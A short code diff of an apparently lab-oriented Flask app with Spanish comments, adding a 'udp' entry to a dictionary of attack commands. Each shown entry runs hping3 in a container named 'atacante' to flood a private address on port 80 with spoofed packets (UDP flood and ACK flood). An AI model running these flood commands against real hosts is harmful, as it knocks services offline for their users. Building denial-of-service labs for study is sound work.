@@ -4,6 +4,7 @@ import subprocess
 app = Flask(__name__)
 
 ATAQUES = {
+    "udp": "docker exec atacante hping3 --udp -d 1000 -p 80 --flood --rand-source 172.20.10.10",
     # Capa 4: UDP Flood (Satura el ancho de banda)
     "ack": "docker exec atacante hping3 -A -p 80 --flood --rand-source 172.20.10.10",
 
